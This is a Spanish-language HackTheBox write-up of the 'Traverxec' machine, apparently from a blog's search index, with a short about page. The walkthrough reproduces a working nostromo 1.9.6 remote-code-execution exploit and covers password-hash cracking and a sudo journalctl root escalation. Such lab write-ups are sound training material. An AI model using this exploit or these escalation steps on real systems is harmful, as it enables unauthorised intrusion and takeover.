[{"categories":null,"content":"whoami Mi nombre es Yadiel Reyes, voy por el alias de wixnic. Soy un apasionado auto motivado que le gusta crear contenido sobre temas relacionados con la Seguridad Informática. En este blog encontrarás el contenido que se detalla a continuación: CTFs Programación Post-Explotación Evasión de AV Ingeniería Inversa Desarrollo de Exploits Cracking Hackeo de Video Juegos Educación: Bachillerato en Tecnología de la Información, Redes y Seguridad (GPA 4.0) Certificaciones: CompTIA Linux+ CompTIA Network+ Certificaciones para las que me estoy preparando OSCP OSEP Recursos Públicos Estos son recursos propios que he hecho para el público: HackNotes Donativo Te gusta mi contenido? Pues una donación es muy apreciada (no es obligatorio) pero me ayuda y se agradece. ","date":"2021-12-08","objectID":"/es/about/:0:0","tags":null,"title":"Sobre Mí","uri":"/es/about/"},{"categories":null,"content":"Donar con criptomoneda Si quieres donar con cripto, tengo estas opciones: Monero: Ethereum: Bitcoin: Dogecoin: ","date":"2021-12-08","objectID":"/es/about/:1:0","tags":null,"title":"Sobre Mí","uri":"/es/about/"},{"categories":null,"content":"Donar con dinero en efectivo Si quieres donar con dinero en efectivo: PayPal: Cómprame un café: ","date":"2021-12-08","objectID":"/es/about/:2:0","tags":null,"title":"Sobre Mí","uri":"/es/about/"},{"categories":["HackTheBox Nix"],"content":"This is my description.","date":"2021-10-22","objectID":"/es/htb_traverxec/","tags":["youtube","nostromo","searchsploit","htaccess","htpasswd","linpeas","hashcat","john","ssh-private-keys","gtfobins","journalctl","wget","curl","python"],"title":"HackTheBox - Traverxec","uri":"/es/htb_traverxec/"},{"categories":["HackTheBox Nix"],"content":"Setup Como siempre, necesitamos un espacio comodo para trabajar así que voy a crear mis directorios de trabajo con la función mk que tengo definida en mi Z shell: ❯ which mk mk () { mkdir {scans,content,loot,exploits,scripts,report} } ❯ mk ❯ ls  content  exploits  loot  report  scans  scripts Recon ","date":"2021-10-22","objectID":"/es/htb_traverxec/:0:0","tags":["youtube","nostromo","searchsploit","htaccess","htpasswd","linpeas","hashcat","john","ssh-private-keys","gtfobins","journalctl","wget","curl","python"],"title":"HackTheBox - Traverxec","uri":"/es/htb_traverxec/"},{"categories":["HackTheBox Nix"],"content":"Identificación de SO Vamos a empezar identificando el sistema operativo del objetivo con la función os de mi Z shell: ❯ which os os () { ttl=\"$(ping -c 1 $1 | awk -F 'ttl=' '{print $2}' | cut -d ' ' -f 1 | tr -d '\\n')\" if (( $ttl \u003c= 64 )) then echo 'OS: Unix/Linux' elif (( $ttl \u003c= 128 )) then echo 'OS: Windows' else echo 'OS: Not detected' fi } ❯ os 10.10.10.165 OS: Unix/Linux Como podemos ver, el sistem operativo del objetivo es Linux. ","date":"2021-10-22","objectID":"/es/htb_traverxec/:1:0","tags":["youtube","nostromo","searchsploit","htaccess","htpasswd","linpeas","hashcat","john","ssh-private-keys","gtfobins","journalctl","wget","curl","python"],"title":"HackTheBox - Traverxec","uri":"/es/htb_traverxec/"},{"categories":["HackTheBox Nix"],"content":"nmap nmap revela que los puertos SSH (TCP 22) y HTTP (TCP 80) estan abiertos: ❯ sudo nmap -p- -n -Pn --min-rate 5000 -oG scans/nmap-tcpall 10.10.10.165 [sudo] password for wixnic: Starting Nmap 7.92 ( https://nmap.org ) at 2021-10-17 18:11 AST Nmap scan report for 10.10.10.165 Host is up (0.094s latency). Not shown: 65533 filtered tcp ports (no-response) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http Nmap done: 1 IP address (1 host up) scanned in 26.52 seconds ❯ which xp xp () { ports=\"$(cat $1 | grep -oP '\\d{1,5}/open' | cut -d '/' -f 1 | tr '\\n' ',' | sed s/,$//)\" echo \"[+] Open ports: $ports\" \u003e\u003e xp.tmp printf $ports | xclip -sel clip echo \"[+] Ports copied to clipboard\" \u003e\u003e xp.tmp /usr/bin/bat xp.tmp rm xp.tmp } ❯ xp scans/nmap-tcpall ───────┬───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── │ File: xp.tmp ───────┼───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── 1 │ [+] Open ports: 22,80 2 │ [+] Ports copied to clipboard ───────┴───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── ❯ sudo nmap -p22,80 -sCV -oA scans/nmap-tcpscripts 10.10.10.165 Starting Nmap 7.92 ( https://nmap.org ) at 2021-10-17 18:12 AST Nmap scan report for 10.10.10.165 Host is up (0.10s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0) | ssh-hostkey: | 2048 aa:99:a8:16:68💿41:cc:f9:6c:84:01:c7:59:09:5c (RSA) | 256 93:dd:1a:23:ee:d7:1f:08:6b:58:47:09:73:a3:88:cc (ECDSA) |_ 256 9d:d6:62:1e:7a:fb:8f:56:92:e6:37:f1:10:db:9b:ce (ED25519) 80/tcp open http nostromo 1.9.6 |_http-title: TRAVERXEC |_http-server-header: nostromo 1.9.6 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 13.14 seconds La versión de OpenSSH revela que la distribución del objetivo pinta ser Debian y que el servicio web es nostromo 1.9.6. ","date":"2021-10-22","objectID":"/es/htb_traverxec/:2:0","tags":["youtube","nostromo","searchsploit","htaccess","htpasswd","linpeas","hashcat","john","ssh-private-keys","gtfobins","journalctl","wget","curl","python"],"title":"HackTheBox - Traverxec","uri":"/es/htb_traverxec/"},{"categories":["HackTheBox Nix"],"content":"Sitio Web - HTTP TCP 80 Podemos ver que el nombre del servicio nostromo 1.9.6 es identificado a través del servicio web con el encabezado o header llamado Server del protocolo HTTP: ❯ curl -I 10.10.10.165 HTTP/1.1 200 OK Date: Sun, 17 Oct 2021 22:19:35 GMT Server: nostromo 1.9.6 Connection: close Last-Modified: Fri, 25 Oct 2019 21:11:09 GMT Content-Length: 15674 Content-Type: text/html Nota: -I = ¡Obtén solo los encabezados! Los servidores HTTP cuentan con el comando HEAD que se usa para obtener nada más que el encabezado de un documento. ","date":"2021-10-22","objectID":"/es/htb_traverxec/:3:0","tags":["youtube","nostromo","searchsploit","htaccess","htpasswd","linpeas","hashcat","john","ssh-private-keys","gtfobins","journalctl","wget","curl","python"],"title":"HackTheBox - Traverxec","uri":"/es/htb_traverxec/"},{"categories":["HackTheBox Nix"],"content":"Shell como www-data ","date":"2021-10-22","objectID":"/es/htb_traverxec/:4:0","tags":["youtube","nostromo","searchsploit","htaccess","htpasswd","linpeas","hashcat","john","ssh-private-keys","gtfobins","journalctl","wget","curl","python"],"title":"HackTheBox - Traverxec","uri":"/es/htb_traverxec/"},{"categories":["HackTheBox Nix"],"content":"Investigación de Vulnerabilidades Usaré searchsploit para encontrar exploits mientras uso el nombre del servicio HTTP que es nostromo, searchsploit muestra tres vulnerabilidades potenciales de Nostromo: ❯ searchsploit nostromo ------------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- Exploit Title | Path ------------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- Nostromo - Directory Traversal Remote Command Execution (Metasploit) | multiple/remote/47573.rb nostromo 1.9.6 - Remote Code Execution | multiple/remote/47837.py nostromo nhttpd 1.9.3 - Directory Traversal Remote Command Execution | linux/remote/35466.sh ------------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- Shellcodes: No Results Papers: No Results ❯ searchsploit -m multiple/remote/47837.py Exploit: nostromo 1.9.6 - Remote Code Execution URL: https://www.exploit-db.com/exploits/47837 Path: /usr/share/exploitdb/exploits/multiple/remote/47837.py File Type: Python script, ASCII text executable Copied to: /home/wixnic/htb/traverxec/47837.py Hay uno de metasploit, luego un script de Python y un script de shell. El script de shell es un exploit para una versión anterior, así que lo ignoraremos. Comencemos primero con el exploit de Python. Código de Python: # Exploit Title: nostromo 1.9.6 - Remote Code Execution # Date: 2019-12-31 # Exploit Author: Kr0ff # Vendor Homepage: # Software Link: http://www.nazgul.ch/dev/nostromo-1.9.6.tar.gz # Version: 1.9.6 # Tested on: Debian # CVE : CVE-2019-16278 # Esta línea debe comentarse o eliminarse #cve2019_16278.py #!/usr/bin/env python import sys import socket art = \"\"\" _____-2019-16278 _____ _______ ______ _____\\ \\ _____\\ \\_\\ | | | / / | | / /| || / / /|/ / /___/| / / /____/||\\ \\ \\ |/| |__ |___|/ | | |____|/ \\ \\ \\ | | | \\ | | _____ \\| \\| | | __/ __ |\\ \\|\\ \\ |\\ /| |\\ \\ / \\ | \\_____\\| | | \\_______/ | | \\____\\/ | | | /____/| \\ | | / | | |____/| \\|_____| || \\|_____|/ \\|____| | | |____|/ |___|/ \"\"\" help_menu = '\\r\\nUsage: cve2019-16278.py \u003cTarget_IP\u003e \u003cTarget_Port\u003e \u003cCommand\u003e' def connect(soc): # Define una respuesta vacía response = \"\" try: while True: # Defina 1024 bytes como la cantidad de bytes recibidos por el socket. # Nota: Para que coincida mejor con las realidades del hardware y la red, el valor de bufsize debe ser una potencia relativamente pequeña de 2, por ejemplo, 4096. En este caso es 2 ^ 10 = 1024 connection = soc.recv(1024) # Si no hay conexión, rompe (termina) if len(connection) == 0: break # Si hay una conexión, agréguela a la variable de response response += connection # Si no recibe una conexión, pase (continúe) except: pass # Devuelve la respuesta return response def cve(target, port, cmd): # Define el socket soc = socket.socket() # Se conecta a la IP y al PUERTO de destino soc.connect((target, int(port))) # Define el payload payload = 'POST /.%0d./.%0d./.%0d./.%0d./bin/sh HTTP/1.0\\r\\nContent-Length: 1\\r\\n\\r\\necho\\necho\\n{}2\u003e\u00261'.format(cmd) # Envía el payload a la IP y al PUERTO de destino soc.send(payload) # Recibe una conexión receive = connect(soc) # Imprime el valor recibido print(receive) if __name__ == \"__main__\": # Imprime el banner art print(art) try: target = sys.argv[1] port = sys.argv[2] cmd = sys.argv[3] # Intenta ejecutar estos 3 argumentos (Ejemplo: 10.10.10.165 80 id) cve(target, port, cmd) # Si ocurre un error de índice, como no especificar la IP, imprime el menú de ayuda except IndexError: print(help_menu) Comenta la línea 10: ❯ sed '10q;d' 47837.py #cve2019_16278.py NUMq saldrá inmediatamente cuando el número de línea sea NUM. d eliminará la línea en lugar de imprimirla; esto se inhibe en la última línea porque la q hace que","date":"2021-10-22","objectID":"/es/htb_traverxec/:4:1","tags":["youtube","nostromo","searchsploit","htaccess","htpasswd","linpeas","hashcat","john","ssh-private-keys","gtfobins","journalctl","wget","curl","python"],"title":"HackTheBox - Traverxec","uri":"/es/htb_traverxec/"},{"categories":["HackTheBox Nix"],"content":"Shell Completamente Interactiva Podemos habilitar un shell TTY / PTY completo con los siguientes comandos. En un shell inverso, iniciamos una shell bash \\ (elija uno de los siguientes, la idea es generar un shell bash ): script /dev/null -c bash python -c 'import pty; pty.spawn(\"/bin/bash\")' echo os.system('/bin/bash') /bin/bash -i perl —e 'exec \"/bin/bash\";' Presionamos Ctrl + Z para salir de la shell y dejarlo ejecutándose en segundo plano, luego en nuestra consola configuramos la TTY con: stty raw -echo; fg Reiniciamos la shell inversa con: reset Definimos el tipo de terminal, xterm que funciona el 99% de las veces: \u003e Terminal Type? xterm Ahora habiltamos el clear screen y el movimiento con xterm y habilitamos la bash: export TERM=xterm export SHELL=bash En otra consola de nuestro host, obtenemos las filas y columnas de la terminal: stty -a En la shell inversa, configuramos las filas y las columnas, esto arreglará los márgenes de la terminal: stty rows \u003cnum\u003e columns \u003ccols\u003e Ahora confirmamos que estamos en una shell de TTY o PTY con: tty Escalada de Privilegios: www-data -\u003e david ","date":"2021-10-22","objectID":"/es/htb_traverxec/:5:0","tags":["youtube","nostromo","searchsploit","htaccess","htpasswd","linpeas","hashcat","john","ssh-private-keys","gtfobins","journalctl","wget","curl","python"],"title":"HackTheBox - Traverxec","uri":"/es/htb_traverxec/"},{"categories":["HackTheBox Nix"],"content":"linPEAS Descargamos linPEAS desde github: ❯ wget https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/linPEAS/linpeas.sh Montamos un HTTP listener: ❯ sudo python3 -m http.server 80 Subimos y corremos linPEAS: www-data@traverxec:/dev/shm$ wget 10.10.16.6/linpeas.sh --2021-10-17 18:33:29-- http://10.10.16.6/linpeas.sh Connecting to 10.10.16.6:80... connected. HTTP request sent, awaiting response... 200 OK Length: 477235 (466K) [text/x-sh] Saving to: 'linpeas.sh' 0K .......... .......... .......... .......... .......... 10% 160K 3s 50K .......... .......... .......... .......... .......... 21% 518K 2s 100K .......... .......... .......... .......... .......... 32% 298K 1s 150K .......... .......... .......... .......... .......... 42% 422K 1s 200K .......... .......... .......... .......... .......... 53% 346K 1s 250K .......... .......... .......... .......... .......... 64% 422K 1s 300K .......... .......... .......... .......... .......... 75% 328K 0s 350K .......... .......... .......... .......... .......... 85% 318K 0s 400K .......... .......... .......... .......... .......... 96% 330K 0s 450K .......... ...... 100% 7.59M=1.4s 2021-10-17 18:33:30 (328 KB/s) - 'linpeas.sh' saved [477235/477235] www-data@traverxec:/dev/shm$ chmod +x linpeas.sh www-data@traverxec:/dev/shm$ ./linpeas.sh ","date":"2021-10-22","objectID":"/es/htb_traverxec/:6:0","tags":["youtube","nostromo","searchsploit","htaccess","htpasswd","linpeas","hashcat","john","ssh-private-keys","gtfobins","journalctl","wget","curl","python"],"title":"HackTheBox - Traverxec","uri":"/es/htb_traverxec/"},{"categories":["HackTheBox Nix"],"content":".htpasswd Una de las cosas que descubrió fue un archivo .htpasswd el cual tiene credenciales: ╔══════════╣ Analyzing Htpasswd Files (limit 70) -rw-r--r-- 1 root bin 41 Oct 25 2019 /var/nostromo/conf/.htpasswd david:$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/ ","date":"2021-10-22","objectID":"/es/htb_traverxec/:7:0","tags":["youtube","nostromo","searchsploit","htaccess","htpasswd","linpeas","hashcat","john","ssh-private-keys","gtfobins","journalctl","wget","curl","python"],"title":"HackTheBox - Traverxec","uri":"/es/htb_traverxec/"},{"categories":["HackTheBox Nix"],"content":"Crack .htpasswd Necesitamos encontrar el módulo que necesitaremos usar para hashcat de esta manera pueda reconocer el hash, en base a la salida podemos ver que el tipo de hash es md5crypt y su número de modo es 500: ❯ cat hash.txt ───────┬───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── │ File: hash.txt ───────┼───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── 1 │ david:$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/ ───────┴───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── ❯ hashcat --example-hashes | grep '\\$1\\$' -B 2 MODE: 500 TYPE: md5crypt, MD5 (Unix), Cisco-IOS $1$ (MD5) HASH: $1$38652870$DUjsu4TTlTsOe/xxZ05uf/ -- MODE: 12200 TYPE: eCryptfs HASH: $ecryptfs$0$1$4207883745556753$567daa975114206c -- MODE: 16700 TYPE: FileVault 2 HASH: $fvde$1$16$84286044060108438487434858307513$20000$f1620ab93192112f0a23eea89b5d4df065661f974b704191 -- MODE: 22100 TYPE: BitLocker HASH: $bitlocker$1$16$6f972989ddc209f1eccf07313a7266a2$1048576$12$3a33a8eaff5e6f81d907b591$60$316b0f6d4cb445fb056f0e3e0633c413526ff4481bbf588917b70a4e8f8075f5ceb45958a800b42cb7ff9b7f5e1 7c6145bf8561ea86f52d3592059fb Ahora que conocemos el modo, podemos intentar descifrar el hash: ❯ find / -name 'hashcat.potfile' 2\u003e/dev/null /home/wixnic/.hashcat/hashcat.potfile ❯ echo '' \u003e ~/.hashcat/hashcat.potfile ❯ hashcat -m 500 hash.txt /usr/share/wordlists/rockyou.txt --username --force ...\u003cSNIP\u003e... $1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/:Nowonly4me ...\u003cSNIP\u003e... También puedes usar john, pero déjame vaciar mi archivo pot primero: ❯ find / -name 'john.pot' 2\u003e/dev/null /home/wixnic/.john/john.pot ❯ echo '' \u003e ~/.john/john.pot Ahora podemos usar john: ❯ john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt Warning: detected hash type \"md5crypt\", but the string is also recognized as \"md5crypt-long\" Use the \"--format=md5crypt-long\" option to force loading these as that type instead Using default input encoding: UTF-8 Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 256/256 AVX2 8x3]) Will run 4 OpenMP threads Press 'q' or Ctrl-C to abort, almost any other key for status Nowonly4me (david) 1g 0:00:00:22 DONE (2021-10-17 18:47) 0.04411g/s 466626p/s 466626c/s 466626C/s Noyoudo..Nous4=5 Use the \"--show\" option to display all of the cracked passwords reliably Session completed Mirando el archivo de configuración de nostromo nhttpd.conf: www-data@traverxec:$ cd /var/nostromo/conf www-data@traverxec:/var/nostromo/conf$ cat nhttpd.conf cat nhttpd.conf # MAIN [MANDATORY] servername traverxec.htb serverlisten * serveradmin david@traverxec.htb serverroot /var/nostromo servermimes conf/mimes docroot /var/nostromo/htdocs docindex index.html # LOGS [OPTIONAL] logpid logs/nhttpd.pid # SETUID [RECOMMENDED] user www-data # BASIC AUTHENTICATION [OPTIONAL] htaccess .htaccess htpasswd /var/nostromo/conf/.htpasswd # ALIASES [OPTIONAL] /icons /var/nostromo/icons # HOMEDIRS [OPTIONAL] homedirs /home homedirs_public public_www Podemos ver que este archivo tiene algunos directorios de inicio y uno de ellos es público que apunta a public_www y el administrador del servidor es david. Si leemos la página del manual de nostromo, podemos ver que en la sección de HOMEDIRS dice lo siguiente: HOMEDIRS To serve the home directories of your users via HTTP, enable the homedirs option by defining the path in where the home directories are stored, normally /home. To access a users home directory enter a ~ in the URL followed by the home directory name like in this example: http://www.nazgul.ch/~hacki/ The content of the home directory is handled exactly the same way as a directory in your document root. If some users don't want that their","date":"2021-10-22","objectID":"/es/htb_traverxec/:8:0","tags":["youtube","nostromo","searchsploit","htaccess","htpasswd","linpeas","hashcat","john","ssh-private-keys","gtfobins","journalctl","wget","curl","python"],"title":"HackTheBox - Traverxec","uri":"/es/htb_traverxec/"},{"categories":["HackTheBox Nix"],"content":"Shell via SSH Ahora que tenemos la clave privada descifrada, podemos usarla para autenticarnos en el servicio SSH como el usuario david: ❯ ssh -i id_rsa_david david@10.10.10.165 The authenticity of host '10.10.10.165 (10.10.10.165)' can't be established. ECDSA key fingerprint is SHA256:CiO/pUMzd+6bHnEhA2rAU30QQiNdWOtkEPtJoXnWzVo. Are you sure you want to continue connecting (yes/no/[fingerprint])? yes Warning: Permanently added '10.10.10.165' (ECDSA) to the list of known hosts. Linux traverxec 4.19.0-6-amd64 #1 SMP Debian 4.19.67-2+deb10u1 (2019-09-20) x86_64 david@traverxec:~$ id uid=1000(david) gid=1000(david) groups=1000(david),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev) david@traverxec:~$ cut -c-5 user.txt 7db0b Escalada de Privilegios: david -\u003e root ","date":"2021-10-22","objectID":"/es/htb_traverxec/:9:0","tags":["youtube","nostromo","searchsploit","htaccess","htpasswd","linpeas","hashcat","john","ssh-private-keys","gtfobins","journalctl","wget","curl","python"],"title":"HackTheBox - Traverxec","uri":"/es/htb_traverxec/"},{"categories":["HackTheBox Nix"],"content":"Enumeración Podemos comenzar enumerando la carpeta de inicio del usuario actual: david@traverxec:~$ ls -lahR \u003c...snip...\u003e david@traverxec:~$ cat bin/server-stats.sh #!/bin/bash cat /home/david/bin/server-stats.head echo \"Load: `/usr/bin/uptime`\" echo \" \" echo \"Open nhttpd sockets: `/usr/bin/ss -H sport = 80 | /usr/bin/wc -l`\" echo \"Files in the docroot: `/usr/bin/find /var/nostromo/htdocs/ | /usr/bin/wc -l`\" echo \" \" echo \"Last 5 journal log lines:\" /usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service | /usr/bin/cat Hay un script que ejecuta sudo en el programa journalctl. ","date":"2021-10-22","objectID":"/es/htb_traverxec/:10:0","tags":["youtube","nostromo","searchsploit","htaccess","htpasswd","linpeas","hashcat","john","ssh-private-keys","gtfobins","journalctl","wget","curl","python"],"title":"HackTheBox - Traverxec","uri":"/es/htb_traverxec/"},{"categories":["HackTheBox Nix"],"content":"Abusando journalctl Si buscamos journalctl en gtfobins (lea gtfobins), hay una opción para sudo. Es bastante breve y simplemente dice: sudo journalctl !/bin/sh El journalctl saldrá a stdout si la cantidad de líneas verticales puede caber en la página actual, de lo contrario, entrará en “less” si no puede. Podemos probar esto en nuestro localhost: sudo journalctl Como puedes ver ahora estamos en “less”: sep 09 20:49:55 parrot kernel: MTRR default type: uncachable sep 09 20:49:55 parrot kernel: MTRR fixed ranges enabled: sep 09 20:49:55 parrot kernel: 00000-9FFFF write-back lines 1-39 En el comando journalctl podemos ver el parámetro -n que toma 5 líneas como argumento, esto significa que solo se enviarán cinco líneas a la salida, por lo que necesitamos reducir la terminal a algo más pequeño que 5 líneas, y seremos enviados a less como el usuario root porque se esta ejecutando con sudo. Probemos esto en nuestro host primero para ver cómo funciona: sudo journalctl -n 5 No olvidemos cambiar el tamaño de la terminal (verticalmente). Sabiendo esto, podemos intentar escalar los privilegios con el comando que se muestra en GTFOBins: david@traverxec:~$ /usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service -- Logs begin at Sun 2021-10-17 18:09:21 EDT, end at Sun 2021-10-17 19:25:33 EDT. -- Oct 17 18:34:04 traverxec sudo[3841]: pam_unix(sudo:auth): authentication failure; logname= uid=33 euid=0 tty= ruser=www-data rhost= user=www-data Oct 17 18:34:06 traverxec sudo[3841]: pam_unix(sudo:auth): conversation failed Oct 17 18:34:06 traverxec sudo[3841]: pam_unix(sudo:auth): auth could not identify password for [www-data] !/bin/bash root@traverxec:/home/david# id uid=0(root) gid=0(root) groups=0(root) root@traverxec:/home/david# cd /root root@traverxec:~# ls nostromo_1.9.6-1.deb root.txt root@traverxec:~# cut -c-5 root.txt 9aa36 Alternativamente, podemos configurar las filas stty para que tengan menos de 5 filas (líneas verticales): david@traverxec:~$ stty rows 1 david@traverxec:~$ /usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service !/bin/bash root@traverxec:/home/david# id uid=0(root) gid=0(root) groups=0(root) root@traverxec:/home/david# ","date":"2021-10-22","objectID":"/es/htb_traverxec/:11:0","tags":["youtube","nostromo","searchsploit","htaccess","htpasswd","linpeas","hashcat","john","ssh-private-keys","gtfobins","journalctl","wget","curl","python"],"title":"HackTheBox - Traverxec","uri":"/es/htb_traverxec/"}]